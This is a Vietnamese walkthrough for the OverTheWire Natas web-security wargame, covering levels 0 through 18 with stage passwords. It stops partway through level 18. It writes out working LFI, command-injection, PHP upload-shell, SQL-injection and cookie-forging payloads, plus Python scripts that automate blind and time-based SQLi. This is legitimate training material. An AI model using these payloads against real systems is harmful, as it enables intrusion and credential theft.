# Writeup Natas Overtherwire
- [Writeup Natas Overtherwire](#writeup-natas-overtherwire)
    - [0. Lv0](#0-lv0)
    - [1. Lv0 -\> Lv1](#1-lv0---lv1)
    - [2. Lv1 -\> Lv2](#2-lv1---lv2)
    - [3. Lv2 -\> Lv3](#3-lv2---lv3)
    - [4. Lv3 -\> Lv4](#4-lv3---lv4)
    - [5. Lv4 -\> Lv5](#5-lv4---lv5)
    - [6. Lv5 -\> Lv6](#6-lv5---lv6)
    - [7. Lv6 -\> Lv7](#7-lv6---lv7)
    - [8. Lv7 -\> Lv8](#8-lv7---lv8)
    - [9. Lv8 -\> Lv9](#9-lv8---lv9)
    - [10. Lv9 -\> Lv10](#10-lv9---lv10)
    - [11. Lv10 -\> Lv11](#11-lv10---lv11)
    - [12. Lv11 -\> Lv12](#12-lv11---lv12)
    - [13. Lv12 -\> Lv13](#13-lv12---lv13)
    - [14. Lv13 -\> Lv14](#14-lv13---lv14)
    - [15. Lv14 -\> Lv15](#15-lv14---lv15)
    - [16. Lv15 -\> Lv16](#16-lv15---lv16)
    - [17. Lv16 -\> Lv17](#17-lv16---lv17)
    - [18. Lv17 -\> Lv18](#18-lv17---lv18)
    - [19. Lv18 -\> Lv19](#19-lv18---lv19)
    - [20. Lv19 -\> Lv20](#20-lv19---lv20)
    - [21. Lv20 -\> Lv21](#21-lv20---lv21)
    - [22. Lv21 -\> Lv22](#22-lv21---lv22)
    - [23. Lv22 -\> Lv23](#23-lv22---lv23)
    - [24. Lv23 -\> Lv24](#24-lv23---lv24)
    - [25. Lv24 -\> Lv25](#25-lv24---lv25)
    - [26. Lv25 -\> Lv26](#26-lv25---lv26)
    - [27. Lv26 -\> Lv27](#27-lv26---lv27)
    - [28. Lv27 -\> Lv28](#28-lv27---lv28)
    - [29. Lv28 -\> Lv29](#29-lv28---lv29)
    - [30. Lv29 -\> Lv30](#30-lv29---lv30)
    - [31. Lv30 -\> Lv31](#31-lv30---lv31)
    - [32. Lv31 -\> Lv32](#32-lv31---lv32)
    - [33. Lv32 -\> Lv33](#33-lv32---lv33)
    - [34. Lv33 -\> Lv34](#34-lv33---lv34)

### 0. Lv0

>username/password : **natas0/natas0**

Đầu tiên ta thực hiện vào kiểm tra trang web thì thấy không có gì ở đây cả.

![](https://i.imgur.com/r1IcPUD.png)

Thử thực hiện kiểm tra source code thì thấy được password trong phần comment.

![](https://i.imgur.com/Js91llk.png)

---
### 1. Lv0 -> Lv1

>username/password : **natas1/g9D9cREhslqBKtcA2uocGHPfMZVzeFK6** 

Tương tự như ở LV0, ta cũng không thể thấy được gì đáng ngờ ở giao diện nên thực hiện kiểm tra source code. 

![](https://i.imgur.com/AjPfRGZ.png)

Tuy nhiên việc click chuột phải đã bị chặn ở trang web này nên ta thử thực hiện kiểm tra source code bằng tổ hợp phím CTRL+U. Và quan sát thì thấy password level tiếp theo nằm trong phần comment.

![](https://i.imgur.com/FbW76AZ.png)

---

### 2. Lv1 -> Lv2

>username/password : **natas2/h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7** 

Giao diện không có gì cả

![](https://i.imgur.com/cdt5eaV.png)

Thử thực hiện kiểm tra source code thì thấy một thẻ html **img** khá khả nghi
```
<img src="files/pixel.png">
```

![](https://i.imgur.com/4gD0937.png)

Thử nhấn click vào đường dẫn thì hiện ra một bức hình nhưng cũng không thu thập được thông tin gì. Quay lui lại thư mục files kiểm tra thì thấy có một file **users.txt**. 

![](https://i.imgur.com/C3b2bdc.png)

Thực hiện kiểm tra thì quan sát được password của level tiếp theo.

![](https://i.imgur.com/X3jKznX.png)

---
### 3. Lv2 -> Lv3

>username/password : **natas3/G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q** 

Tương tự như các level trước thì giao diện cũng chả có gì và ta thực hiện kiểm tra source thì có một hint ở đây.

![](https://i.imgur.com/Sf5Oh1V.png)

Hint này cho thấy rằng Google sẽ không thể tìm thấy. Ta liền nghĩ đến file robots.txt vì file này sinh ra với mục đích chỉ định các trang web hoặc phần của trang web nào được phép truy cập và không được truy cập bởi các công cụ tìm kiếm.

![](https://i.imgur.com/1bmoBq3.png)

Và ta thấy được một đường dẫn bí mật là **/s3cr3t/**. Thử thực hiện kiểm tra thì ta thấy được có một file **users.txt** ở đây.

![](https://i.imgur.com/gc82EWX.png)

Thực hiện kiểm tra thì quan sát được password của level tiếp theo.

![](https://i.imgur.com/XJdAIgF.png)

    

---
### 4. Lv3 -> Lv4

>username/password : **natas4/tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm** 

Vào trang web thì có thông báo cho thấy rằng ta không được phép truy cập vì chỉ có user đến từ natas5 mới có quyền truy cập.

![](https://i.imgur.com/H5WNyfc.png)

Câu trên cũng chính là một hint, tức là tham số referer của request header phải là http://natas5.natas.labs.overthewire.org/ thì mới truy cập được. Vậy nên ta dùng burp suite để bắt request thử thì thấy ở đây tham số Referer là http://natas4.natas.labs.overthewire.org/index.php.

![](https://i.imgur.com/XGy3t2P.png)

Thực hiện thay đổi tham số Referer và quan sát thì thấy ta đã có được password.

![](https://i.imgur.com/Yob3fis.png)


---
### 5. Lv4 -> Lv5

>username/password : **natas5/Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD** 

Truy cập vào thì thấy được rằng chúng ta không thể truy cập vào được vì chúng ta không đăng nhập.

![](https://i.imgur.com/GtieQjl.png)

Kiểm tra source thì cũng chả có gì, ta thử thực hiện quan sát request để xem chuyện gì đã xảy ra 

![](https://i.imgur.com/f33IMCT.png)

Thì thấy được rằng có thể là do tham số **loggedin=0** nên trang web cho rằng chúng ta chưa đăng nhập. Thử thực hiện thay đổi tham số này thành **loggedin=1**.

![](https://i.imgur.com/HL2tuez.png)

Quan sát thấy chúng ta đã có thể truy cập và lấy được password cho level tiếp theo.

---
### 6. Lv5 -> Lv6

>username/password : **natas6/fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR** 

Khi vào trang web này ta có thể thấy một hộp input và thử nhập bất kỳ vào và submit thì nó báo là **Wrong secret**. 

![](https://i.imgur.com/rPsG06G.png)

Thử nhấn **View sourcecode** để quan sát code và xem cách mà chương trình hoạt động để bypass được level này.

![](https://i.imgur.com/LwPYou8.png)

Có thể thấy rằng nó thực hiện include file **/includes/secret.inc** và thực hiện chức năng so sánh giá trị mình nhập vào với biến $secret. Nhưng ta không biết biến $secret có giá trị là gì. Nên thử truy cập vào file được include để xem có thông tin gì của biến này không.

![](https://i.imgur.com/Zg4Anm1.png)

Thì thấy được rằng biến $secret được khai báo là **FOEIUWGHFEEUHOFUOIU**. Vậy ta chỉ cần nhập giá trị này vào là có thể bypass được level này.

![](https://i.imgur.com/7LxilVY.png)

Quan sát được rằng ta đã có quyền truy cập và có được password của level tiếp theo

---
### 7. Lv6 -> Lv7

>username/password : **natas7/jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr** 

Quan sát thì thấy giao diện chả có gì cả, và chương trình dùng tham số page để điều hương trang khi ta nhấn vào **Home** hoặc **About**

![](https://i.imgur.com/0Wx3fmY.png)

Thử thực hiện kiểm tra source thì thấy rằng chương trình cung cấp cho ta một hint đó là password nằm ở đường dẫn **/etc/natas_webpass/natas8**. Dựa vào việc điều hương trang bằng tham số và hint này ta liền nghĩ trang web này có thể tồn tại lỗ hỏng LFI (Local File Inclusion).

![](https://i.imgur.com/dMapr2v.png)

Vậy nên ta thử thực hiện payload **?page=/etc/natas_webpass/natas8** xem nó có thật sự bị lỗi LFI hay không.

![](https://i.imgur.com/RRqzZpd.png)

Và kết quả cho thấy nó đã thật sự bị lỗi LFI và trang web trả về cho ta nội dung password của level tiếp theo

---
### 8. Lv7 -> Lv8

>username/password : **natas8/a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB** 

Khá giống ở level 6. 

![](https://i.imgur.com/MUr0hvV.png)

Thử thực hiện kiểm tra code 

![](https://i.imgur.com/7qghtMO.png)

Ta thấy rằng chương trình sẽ encode giá trị ta nhập vào và so sánh với biến `$encodedSecret`  đang mang giá trị  `3d3d516343746d4d6d6c315669563362`. Vậy để bypass được thì ta cần tìm xem giá trị nào encode ra giống thế hoặc decode giá trị `3d3d516343746d4d6d6c315669563362` để tìm.

Đương nhiên ở đây chọn decode là một quyết định dễ dàng hơn nhiều. Ta thực hiện decode lần lượt từ `hex2bin` -> `strrev`-> `base64_decode` là xong.

Giá trị `3d3d516343746d4d6d6c315669563362` sau khi decode `hex2bin` sẽ là `==QcCtmMml1ViV3b`, thực hiện `strrev` sẽ là `b3ViV1lmMmtCcQ==` và cuối cùng thực hiện base64_decode sẽ là `oubWYf2kBq`

Vậy ta chỉ cần nhập giá trị `oubWYf2kBq` vào là có thể bypass được level này

![](https://i.imgur.com/wiESJGu.png)

Quan sát được rằng ta đã có quyền truy cập và có được password của level tiếp theo

---
### 9. Lv8 -> Lv9

>username/password : **natas9/Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd** 

Đây là một trang web từ có chứa một giá trị gì đó do mình nhập, ở đây thử nhập giá trị `a` và tìm kiếm thì ra khá nhiều kết quả. 

![](https://i.imgur.com/eZthYKs.png)

Thử nhấn `View sourcecode` để quan sát cách hoạt động của nó

![](https://i.imgur.com/K6OfJU4.png)

Thì thấy rằng chương trình sẽ thực hiện hàm `passthru` để thực hiện câu lệnh hệ thống `grep` để tìm giá trị `a` mình đã nhập từ file `dictionary.txt`. Và để ý rằng ở đây hoàn toàn không có cơ chế kiểm tra nên ta có thể tận dụng nó để đọc password level tiếp theo bằng câu lệnh hệ thống.

Vậy như đã biết thì password level 10 sẽ nằm trong thư mục `/etc/natas_webpass/natas10`. Vậy ta chỉ cần truyền cho biến `$key=''; cat /etc/natas_webpass/natas10 ;`. Tức là ta thực hiện ngắt câu lệnh `grep` bằng dấu `;` và thực hiện lệnh `cat` để đọc file password ở `/etc/natas_webpass/natas10`

![](https://i.imgur.com/SaRl5oY.png)

Quan sát được rằng ta đã có được password của level tiếp theo

---
### 10. Lv9 -> Lv10

>username/password : **natas10/D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE** 

Giao diện có thể thấy tương tự như level trước.

![](https://i.imgur.com/3TFxcZd.png)

Nhưng lần này có thêm cơ chế kiểm tra đầu vào bằng hàm `preg_match`, nó sẽ kiểm tra giá trị đầu vào của mình có tồn tại các ký tự `; | &` hay không để thực hiện block.

![](https://i.imgur.com/S6wY8fN.png)

Vậy mục đích của ta level này cũng tương tự như level trên nhưng phải cố gắng bypass được cơ chế kiểm tra này.

Vậy ta chỉ cần truyền cho biến `$key='' /etc/natas_webpass/natas11`. Tức là sẽ thực hiện in ra toàn bộ nội dung của tập tin `/etc/natas_webpass/natas11` và `dictionary.txt`

![](https://i.imgur.com/BXuPQuE.png)

Quan sát được rằng ta đã có được password của level tiếp theo

---
### 11. Lv10 -> Lv11

>username/password : **natas11/1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg** 

Đây là một trang web cho phép ta đổi màu nền bằng mã HEX. Ở đây ta thử thực hiện đổi thành màu đỏ bằng mã HEX `#FF0000`.

![](https://i.imgur.com/saBkQXV.png)

Để quan sát cách hoạt động của nó thì t nhấn vào `View sourcecode`. Thì thấy đoạn quan trọng nhất ở đây là nếu `$data["showpassword"] == "yes"` thì sẽ hiện ra password của level tiếp theo.

![](https://i.imgur.com/O9Re8Va.png)

Đầu tiên ta nói sơ về các hàm có trong chương trình chúng ta 

![](https://i.imgur.com/yW98bfb.png)

- Đầu tiên khai báo một biến defaultdata là một array với giá trị `showpassword=no` và `bgcolor=#ffffff`.
- xor_encypt : Đây là hàm mã hóa XOR với một biến `$key` cố định. Nó sẽ duyệt qua từng phần tử của chuỗi và XOR với giá trị key tại vị trí `$i % strlen($key)`
- loadData : Thực hiện lấy dữ liệu từ cookie. Đầu vào của hàm là một mảng `$def` chứa các giá trị mặc định. Đầu tiên, hàm sử dụng từ khóa `global` để truy cập vào mảng `$_COOKIE` chứa các giá trị cookie được gửi từ máy khách đến máy chủ. Sau đó, hàm tiến hành giải mã giá trị cookie có tên `data` và nếu mảng được giải mã có chứa 2 từ khóa `showpassword` và `bgcolor` thì sẽ kiểm tra regular expression của `bgcolor`, nếu thõa hàm sẽ thay đổi giá trị của mảng `$mydata` với các giá trị đã được giải mã. Tuy nhiên nếu khôgn tồn tại key phù hợp thì sẽ trả về giá trị mặc định được khai báo lúc đầu.
- saveData: Hàm này được sử dụng để lưu trữ dữ liệu vào cookie

Vậy bây giờ mục đích của chúng ta đó chính là thay đổi `$data["showpassword"] == "yes"`, để làm được điều đó thì ta cần tạo ra một `cookie` phù hợp để hàm `loadData` có thể lấy được dữ liệu. Để tạo ra một `cookie` phù hợp thì ta cần tìm ra `$key` của `XOR encode`. 

Được rồi, lập luận thế là xong, ta đi đến giải quyết nó thôi.

- Tìm `$key` của `XOR encode`: Để tìm `$key` của thì ta cần biết tính chất của phép XOR đó là `a^b=c thì a^c=b` vậy nên ở đây ta có `plaintext ^ key = ciphertext` thì ta chỉ cần áp dụng công thức `plaintext ^ ciphertext =key`. Ở đây `plaintext= {"showpassword":"no","bgcolor":"#ffffff"}` còn ciphertext thì chúng ta có thể bắt burp suite để quan sát `ciphertext = MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oCA58e354bjY=` 

    ```
    import base64
    import json

    ciphertext = b"MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY="
    ciphertext = base64.decodebytes(ciphertext)
    plaintext = {"showpassword":"no", "bgcolor":"#ffffff"}
    #xóa khoảng trắng vì json python khác php 
    plaintext = json.dumps(plaintext).encode('utf-8').replace(b" ", b"")

    def xor_decrypt(plaintext, ciphertext):
        key = ""
        for i in range(len(plaintext)):
            key += str(chr(ciphertext[i] ^ plaintext[i % len(plaintext)]))
        return key

    key = xor_decrypt(ciphertext, plaintext)
    print(key)

    # result = KNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLK
    ```
- Thực hiện tính toán một cookie mới với giá trị `showpassword=yes`

    ```
    import base64
    import json

    key = b"KNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLKN"
    new_cookie = {"showpassword":"yes", "bgcolor":"#ffffff"}
    new_cookie = json.dumps(new_cookie).encode('utf-8').replace(b" ", b"")

    def xor_encrypt(key, cookie):
        data = ""
        for x in range(len(key)):
            data += str(chr(cookie[x] ^ key[x % len(key)]))

        data = base64.encodebytes(data.encode('utf-8'))
        return data

    data = xor_encrypt(key, new_cookie)
    print(data)
    #result= MGw7JCQ5OC04PT8jOSpqdmk3LT9pYmouLC0nICQ8anZpbS4qLSguKmkz
    ```
Vậy là ta đã có giá trị cookie mới. Bây giờ thực hiện thay thế giá trị cookie mới này vào và kiểm tra kết quả.

![](https://i.imgur.com/45xqCLe.png)

Quan sát được rằng ta đã có được password của level tiếp theo

---
### 12. Lv11 -> Lv12

>username/password : **natas12/YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG** 

Đây là một trang web cho phép chúng ta upload file 

![](https://i.imgur.com/z0Hqb4A.png)

Ta thử upload một file ngẫu nhiên để xem thử nó hoạt động như nào? Thì thấy rằng nó upload lên đường dẫn `upload/0ns2uh7tpx.jpg` 

![](https://i.imgur.com/LdRWevP.png)


Thử xem cách hoạt động của nó thì thấy rằng form này sẽ được xử lý tại `index.php` với phương thức `POST`

![](https://i.imgur.com/lTdbPE5.png)

Và dưới đây là các hàm và cách nó xử lý form này.

![](https://i.imgur.com/zuUTJsr.png)

Thì sau khi đọc code có thể rút ra được rằng :
- Tên file được tạo một cách ngẫu nhiên
- Phần extention lấy từ thuộc tính filename của form upload
- Phần extention thì mặc định là .jpg
Vì mọi thuộc tính của form (name và value) đều có thể thay đổi được, nên ta hoàn toàn có thể upload 1 file `.php` lên web để thực thi tác vụ mình muốn
Ý tưởng đã có, ta bắt tay vào thực hiện thôi :

- Đầu tiên ta tạo một file `lv12.php` với nội dung 
    ```
    <?php
    echo system("cat /etc/natas_webpass/natas13");
    ?>
    ```
- Tiếp sau đó thực hiện upload file này lên và bắt burp suite lại để sửa extension của file.

    ![](https://i.imgur.com/jhy9nRy.png)

- Thực hiện click vào đường dẫn sau khi thực hiện upload xong.
    
    ![](https://i.imgur.com/MFb8SjJ.png)

- Chương trình sẽ thực hiện file `php` đã upload lên

    ![](https://i.imgur.com/GxtVVSv.png)
    
- Quan sát được rằng ta đã có được password của level tiếp theo
---
### 13. Lv12 -> Lv13

>username/password : **natas13/lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9** 

![](https://i.imgur.com/2g0aSCH.png)


Bài này tương tự như bài trên, nhưng nó có thêm cơ chế kiểm tra exif_imagetype, nó kiểm tra một vài byte đầu tiên của file để xác định xem file đó có phải file ảnh hay không.

Vì vậy để bypass được cơ chế kiểm tra này bằng cách chèn nội dung 1 file ảnh vào trước đoạn code php của file `lv12.php` hoặc thêm một magic number của bitmap file để đánh lừa chương trình rằng đó là một `bmp file` 

Ý tưởng đã có và ta bắt đầu thực hiện thôi :
- Đầu tiên tạo file `lv13.php` bằng cách như đã nói ở trên.

    ```
    BMP<?php
    echo system("cat /etc/natas_webpass/natas14");
    ?>
    ```
- Tiếp sau đó thực hiện upload file này lên và bắt burp suite lại để sửa extension của file.

    ![](https://i.imgur.com/O7PkVc9.png)

    
- Thực hiện click vào đường dẫn sau khi thực hiện upload xong.
    
    ![](https://i.imgur.com/JkFd6CS.png)
    
- Chương trình sẽ thực hiện file `php` đã upload lên

    ![](https://i.imgur.com/XK7cL4P.png)

- Quan sát được rằng ta đã có được password của level tiếp theo
---
### 14. Lv13 -> Lv14

>username/password : **natas14/qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP** 

Đây là một trang web login.

![](https://i.imgur.com/rlN3j3L.png)

Thử thực hiện kiểm tra code thì thấy được cách xử lý câu query bằng cách nối chuỗi. Và kiểm tra nếu câu lệnh query trả về từ 1 record trở lên thì sẽ xuất ra password natas15.

![](https://i.imgur.com/Y48XPT7.png)

Việc xử lý nối chuỗi như này sẽ dẫn đến lỗ hỏng SQLi. Thử thực hiện payload `username = "or 1=1 -- -` và `password= anything` tức là ở đây câu select sẽ hiểu như thế này 
```
SELECT * from users where username="" or 1=1 -- -and password=anything
```
Vậy nên chương trình sẽ hiểu là lấy tất cả các record từ bảng users với điều kiện là username="" hoặc 1=1 => điều kiện ở đây sẽ là luôn đúng vì 1=1 là luôn đúng. Còn phần password thì đã bị comment lại. Vậy kết quả sẽ trả về tất cả các dòng trong bảng users
Thế nên ta có thể dễ dàng đăng nhập thành công 

![](https://i.imgur.com/vbFsJBl.png)

Quan sát được rằng ta đã có được password của level tiếp theo

---
### 15. Lv14 -> Lv15

>username/password : **natas15/TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB** 

Đây là một trang web giúp kiểm tra thử username có tồn tại hay chưa.

![](https://i.imgur.com/Dp1DUEl.png)

Thử kiểm tra `username=natas16`  thì có thể thấy user tồn tại. Vậy mục đích của chúng ta có thể là lấy được password của user này.

![](https://i.imgur.com/fPPKxIU.png)

Tuy nhiên có vẻ như ta không thể thực hiện được theo cách sử dụng câu lệnh union vì nó chỉ hiển thị là có hoặc không sự tồn tại của user. Có thể nhận định đây là một loại `Blind SQLi`. 

Vậy ta có thể thực hiện brute force từng ký tự password để của nó. Ví dụ ta có thể hỏi nó rằng password có bắt đầu bằng chữ `a` hay không bằng payload `natas16" and password like binary "a%" -- -` lúc này query sẽ là  

```
SELECT * from users where username="natas16" and password like binary "a%"-- -
```
Nếu có thì nó sẽ trả về `This user exists` còn không thì `This user doesn’t exist`.

Vậy ta chỉ cần thực hiện burpt-suite để brute force.

- Đầu tiên thực hiện Intercept gói tin với payload trên 

    ![](https://i.imgur.com/S4KHZKU.png)

- Sau đó đưa nó qua tab Intruder và chọn giá trị `a` để chuẩn bị brute-force. Set payload là brute-force từ `a->z,A->Z,0->9`
- Sau đó nhấn start attack để có thể dò. Ở đây có thể thấy giá trị đầu tiên đó chính là chữ `T`

    ![](https://i.imgur.com/wCHDgL9.png)

- Với payload để kiểm tra giá trị ở vị trí tiếp theo đó là `natas16" and password like binary "Ta%" -- -`. Và cứ tiếp tục như thế 
- Password cuối cùng của chúng ta sẽ là `TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V` 
    
Hoặc có thể sử dụng đoạn code python này để làm điều tương tự một cách đơn giản hơn 
```
import requests
import sys
from string import digits, ascii_lowercase, ascii_uppercase

url = "http://natas15.natas.labs.overthewire.org/"
charset = ascii_lowercase + ascii_uppercase + digits
sqli = 'natas16" AND password LIKE BINARY "'

s = requests.Session()
s.auth = ('natas15', 'TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB')

password = ""
while len(password) < 32:
    for char in charset:
        r = s.post('http://natas15.natas.labs.overthewire.org/', data={'username':sqli + password + char + "%"})
        if "This user exists" in r.text:
            sys.stdout.write(char)
            sys.stdout.flush()
            password += char
            break

```
    
---
### 16. Lv15 -> Lv16

>username/password : **natas16/TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V** 

Bài này tương tự một số bài ở level trước, cho phép chúng ta tìm từ có chứa ký tự do mình chỉ định.

![](https://i.imgur.com/Eqvwj0q.png)

Tuy nhiên khi check code thì thấy rằng nó được code một cách bảo mật hơn. Với các regular một cách kỹ càng hơn.

![](https://i.imgur.com/naDrVa2.png)

Vậy để có thể bypass được điều này thì ta cần biết đến cách sử dụng `$()`.Nó có thể lồng các câu lệnh con vào làm tham số của một câu lệnh khác.
Ví dụ : Ở đây chương trình sẽ chạy bên trong `$()`trước và lấy giá trị đó làm tham số cho echo bên ngoài.
```
echo $(echo abc)
#result : abc
```
Vậy bây giờ ta sẽ dùng nó để có thể truyền tham số cho lệnh grep. Cơ bản cấu trúc sẽ như thế này `grep -i $(tham số) dictionary.txt`. 

Nhưng truyền như thế nào để có thể xác định được mật khẩu cho level tiếp theo. Ở đây chúng ta có thể sử dụng biểu thức chính quy để có thể dò từng ký tự giống như `blind sqli` ở trên.
Payload lúc này sẽ là `$(grep -E ^a.* /etc/natas_webpass/natas17)` với option `-E` là để sử dụng Extended Regular Expression, `^a` là để chỉ ra rằng password bắt đầu bằng a. Còn `.*` là một biểu thức chính quy cho phép tìm kiếm bất kỳ ký tự nào (bao gồm cả ký tự rỗng) sau ký tự `a`. Khi thực hiện payload này sẽ có 2 trường hợp xảy ra.

- Nếu password level tiếp theo bắt đầu bằng chữ `a`. Thì sẽ trả vể giá trị password làm tham số cho lệnh ngoài, lúc này sẽ là `grep -i password dictionary.txt`. Điều này dẫn đến kết quả sẽ không có gì cả.
- Nếu password level tiếp theo không bắt đầu bằng chữ `a`. Thì kết quả trả về là giá trị rỗng và làm tham số cho lệnh ngoài, thì lúc này sẽ là `grep -i '' dictionary.txt`. Điều này dẫn đến kết quả sẽ in ra tất cả các giá trị trong `dictionary.txt`.

Vậy ta sẽ dùng phương pháp thử này để có thể dự đoán được password cho level tiếp theo. Thực hiện dự đoán bằng burpsuite tương tự như blind SQLI ở trên thì ta có được password là `XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd`

Hoặc có thể sử dụng đoạn code python này để làm điều tương tự một cách đơn giản hơn 

```
import requests
import sys
from string import digits, ascii_lowercase, ascii_uppercase

charset = ascii_lowercase + ascii_uppercase + digits
s = requests.Session()
s.auth = ('natas16', 'TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V')

password = ""
while len(password) < 32:
    for char in charset:
        payload = {'needle': '$(grep -E ^%s.* /etc/natas_webpass/natas17)' % (password + char)}
        r = s.get('http://natas16.natas.labs.overthewire.org/index.php', params=payload)

        if len(r.text) == 1105:
            sys.stdout.write(char)
            sys.stdout.flush()
            password += char
            break

```
---
### 17. Lv16 -> Lv17

>username/password : **natas17/XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd** 

Chall này khá giống chall `Blind SQLi` ở trên, nhưng có điều khi ta thử thực hiện kiểm tra username `natas18` thì lại hoàn toàn không có thông báo gì cả.

![](https://i.imgur.com/dPA7iIP.png)

Thực hiện kiểm tra code thì thấy rằng các dòng thông báo đã bị comment lại.

![](https://i.imgur.com/p0Bu02G.png)

Đây có vẻ đúng là `Blind` =))
Vậy ta không thể nhận biết sự khác biệt bằng mắt thì ta có thể nhận biết sự khác biệt bằng thứ khác. Cụ thể ở đây ta có thể để cho nó delay tầm 5 giây nếu kết quả trả về đúng.

Payload của chúng ta lúc này sẽ là `natas18" and password like binary "a%" and sleep 5 -- -` lúc này query sẽ là  

```
SELECT * from users where username="natas18" and password like binary "a%" and sleep 5-- -
```
Nếu ký tự đầu tiên là `a` thì kết quả trả về sẽ bị chậm 5 giây, ngược lại thì sẽ nhận được kết quả ngay lập tức.

Tận dụng đoạn code ở level trên và chỉnh sửa một tí để có thể tự động hóa việc thử lỗi này.

```
import requests
import sys
from string import digits, ascii_lowercase, ascii_uppercase

charset = ascii_lowercase + ascii_uppercase + digits
sqli_1 = 'natas18" AND password LIKE BINARY "'
sqli_2 = '" AND SLEEP(5)-- '

s = requests.Session()
s.auth = ('natas17', 'XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd')

password = ""
# We assume that the password is 32 chars 
while len(password) < 32:
    for char in charset:
        try:
            payload = {'username':sqli_1 + password + char + "%" + sqli_2}
            r = s.post('http://natas17.natas.labs.overthewire.org/', data=payload, timeout=1)
        except requests.Timeout:
            sys.stdout.write(char)
            sys.stdout.flush()
            password += char
            break

```
Thực hiện đoạn code trên và nhận lại được password cho level tiếp theo là `8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq`

---
### 18. Lv17 -> Lv18

>username/password : **natas18/8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq** 

Level này yêu cầu chúng ta đăng nhập với tư cách là một admin để có thể lấy thông tin đăng nhập cho level tiếp theo.

![](https://i.imgur.com/oBfOiYq.png)

Thực hiện quan sát code thì có thể thấy rằng code có vẻ khác phức tạp.

```
$maxid = 640; // 640 should be enough for everyone

function isValidAdminLogin() { /* {{{ */
    if($_REQUEST["username"] == "admin") {
    /* This method of authentication appears to be unsafe and has been disabled for now. */
        //return 1;
    }

    return 0;
}
/* }}} */
function isValidID($id) { /* {{{ */
    return is_numeric($id);
}
/* }}} */
function createID($user) { /* {{{ */
    global $maxid;
    return rand(1, $maxid);
}
/* }}} */
function debug($msg) { /* {{{ */
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}
/* }}} */
function my_session_start() { /* {{{ */
    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
    if(!session_start()) {
        debug("Session start failed");
        return false;
    } else {
        debug("Session start ok");
        if(!array_key_exists("admin", $_SESSION)) {
        debug("Session was old: admin flag set");
        $_SESSION["admin"] = 0; // backwards compatible, secure
        }
        return true;
    }
    }

    return false;
}
/* }}} */
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas19\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
    }
}
/* }}} */

$showform = true;
if(my_session_start()) {
    print_credentials();
    $showform = false;
} else {
    if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
    session_id(createID($_REQUEST["username"]));
    session_start();
    $_SESSION["admin"] = isValidAdminLogin();
    debug("New session started");
    $showform = false;
    print_credentials();
    }
}

if($showform) {
?>

<p>
Please login with your admin account to retrieve credentials for natas19.
</p>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password"><br>
<input type="submit" value="Login" />
</form>
<?php } ?>
```

Đầu tiên ta giải thích code một chút :
- Khai báo giá trị `$maxid=640`
- `isValidAdminLogin()` luôn return ra 0
- `isValidID()` hàm này nhận vào `id` và kiểm tra xem có phải là số hay không và trả về một giá trị boolean cho biết kết quả.
- `createID()` để tạo ngẫu nhiên `id` có giá trị từ `1->640` cho một user.
- `debug()` để xuất thông báo.
- `my_session_start()` hàm này được sử dụng để khởi động một session. Nó kiểm tra xem có tồn tại một cookie `PHPSESSID` trong mảng `$_COOKIE` không bằng hàm `array_key_exists`. Nếu cookie này tồn tại và có giá trị hợp lệ (kiểm tra bằng hàm `isValidID`), hàm sẽ tiến hành khởi động phiên làm việc bằng hàm `session_start()`.Nếu khởi động session thành công, hàm sẽ kiểm tra xem biến `admin` đã được đặt trong session chưa. Nếu chưa hàm sẽ thiết lập giá trị ban đầu của nó là 0. Nếu không tìm thấy cookie PHPSESSID hoặc cookie không hợp lệ, hoặc nếu khởi động phiên làm việc không thành công, hàm sẽ trả về giá trị false
- `print_credentials()` Kiểm tra các điều kiện để xác định người dùng đăng nhập với tư cách là `admin`. Nếu đúng thì sẽ in ra password level tiếp theo, ngược lại thì không.
